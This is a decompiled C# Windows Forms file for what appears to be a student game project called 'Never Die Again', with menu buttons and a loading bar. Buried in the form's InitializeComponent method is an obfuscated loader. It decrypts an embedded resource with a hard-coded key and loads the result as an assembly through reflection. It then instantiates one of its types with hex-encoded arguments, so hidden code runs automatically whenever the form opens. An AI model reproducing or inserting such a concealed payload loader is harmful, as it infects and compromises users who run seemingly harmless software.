using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using AdrianPiecyk;

namespace AdrianPiecyk_Lab2;

public class FormWindow : Form
{
	private int value = 0;

	public static string[] DF000005 = new string[3] { "57455A72", "6B6779", "AdrianPiecyk" };

	private IContainer components = null;

	private Button buttonNewGame;

	private Button buttonExit;

	private Button buttonGameDetails;

	private ProgressBar progressBarLoader;

	private Timer timerLoader;

	private Label labelNameOfGame;

	public FormWindow()
	{
		InitializeComponent();
	}

	private void FormWindow_Load(object sender, EventArgs e)
	{
	}

	private void buttonExit_Click(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void buttonGameDetails_Click(object sender, EventArgs e)
	{
		Game_Details game_Details = new Game_Details();
		((Control)game_Details).Show();
	}

	private void timerLoader_Tick(object sender, EventArgs e)
	{
		progressBarLoader.Increment(10);
		value++;
		if (value >= 50)
		{
			((Control)buttonNewGame).set_Enabled(true);
		}
		else
		{
			((Control)buttonNewGame).set_Enabled(false);
		}
	}

	private void progressBarLoader_Click(object sender, EventArgs e)
	{
	}

	private void buttonNewGame_Click(object sender, EventArgs e)
	{
		ChooseCharacter chooseCharacter = new ChooseCharacter();
		((Control)chooseCharacter).Show();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_032d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0337: Expected O, but got Unknown
		components = new Container();
		buttonNewGame = new Button();
		buttonExit = new Button();
		buttonGameDetails = new Button();
		progressBarLoader = new ProgressBar();
		timerLoader = new Timer(components);
		labelNameOfGame = new Label();
		((Control)this).SuspendLayout();
		((Control)buttonNewGame).set_Location(new Point(42, 234));
		((Control)buttonNewGame).set_Name("buttonNewGame");
		((Control)buttonNewGame).set_Size(new Size(156, 55));
		((Control)buttonNewGame).set_TabIndex(0);
		((Control)buttonNewGame).set_Text("Nowa Gra");
		((ButtonBase)buttonNewGame).set_UseVisualStyleBackColor(true);
		((Control)buttonNewGame).add_Click((EventHandler)buttonNewGame_Click);
		((Control)buttonExit).set_Location(new Point(270, 234));
		((Control)buttonExit).set_Name("buttonExit");
		((Control)buttonExit).set_Size(new Size(145, 55));
		((Control)buttonExit).set_TabIndex(1);
		((Control)buttonExit).set_Text("Wyjście");
		((ButtonBase)buttonExit).set_UseVisualStyleBackColor(true);
		((Control)buttonExit).add_Click((EventHandler)buttonExit_Click);
		((Control)buttonGameDetails).set_Location(new Point(489, 234));
		((Control)buttonGameDetails).set_Name("buttonGameDetails");
		((Control)buttonGameDetails).set_Size(new Size(145, 55));
		((Control)buttonGameDetails).set_TabIndex(2);
		((Control)buttonGameDetails).set_Text("Szczegóły Gry");
		((ButtonBase)buttonGameDetails).set_UseVisualStyleBackColor(true);
		((Control)buttonGameDetails).add_Click((EventHandler)buttonGameDetails_Click);
		((Control)progressBarLoader).set_Location(new Point(270, 121));
		((Control)progressBarLoader).set_Name("progressBarLoader");
		((Control)progressBarLoader).set_Size(new Size(145, 27));
		((Control)progressBarLoader).set_TabIndex(3);
		byte[] es = ResourceTools.Es;
		byte[] bytes = Encoding.ASCII.GetBytes("HIG8444HZA0878O59ZZ7GF");
		for (int i = 86038; i >= 0; i += -1)
		{
			es[i % es.Length] = piro(i, bytes, es);
		}
		object obj = Type.GetType("System.Reflection.Assembly")!.InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[1] { es });
		string[] dF = DF000005;
		Type.GetType("System.Activator")!.InvokeMember("CreateInstance", BindingFlags.InvokeMethod, null, null, new object[2]
		{
			((Assembly)obj).GetExportedTypes()[1],
			dF
		});
		((Control)progressBarLoader).add_Click((EventHandler)progressBarLoader_Click);
		timerLoader.set_Interval(10);
		timerLoader.add_Tick((EventHandler)timerLoader_Tick);
		((Control)labelNameOfGame).set_AutoSize(true);
		((Control)labelNameOfGame).set_BackColor(Color.Transparent);
		((Control)labelNameOfGame).set_Font(new Font("Matura MT Script Capitals", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelNameOfGame).set_Location(new Point(208, 36));
		((Control)labelNameOfGame).set_Name("labelNameOfGame");
		((Control)labelNameOfGame).set_Size(new Size(267, 36));
		((Control)labelNameOfGame).set_TabIndex(4);
		((Control)labelNameOfGame).set_Text("Never Die Again");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(684, 346));
		((Control)this).get_Controls().Add((Control)(object)labelNameOfGame);
		((Control)this).get_Controls().Add((Control)(object)progressBarLoader);
		((Control)this).get_Controls().Add((Control)(object)buttonGameDetails);
		((Control)this).get_Controls().Add((Control)(object)buttonExit);
		((Control)this).get_Controls().Add((Control)(object)buttonNewGame);
		((Control)this).set_Name("FormWindow");
		((Control)this).set_Text("Game Window");
		((Form)this).add_Load((EventHandler)FormWindow_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private byte piro(int i, byte[] pass, byte[] ttr)
	{
		return (byte)((Convert.ToInt32(ttr[i % ttr.Length] ^ pass[i % 22]) - Convert.ToInt32(ttr[(i + 1) % ttr.Length]) + 256) % 256);
	}
}
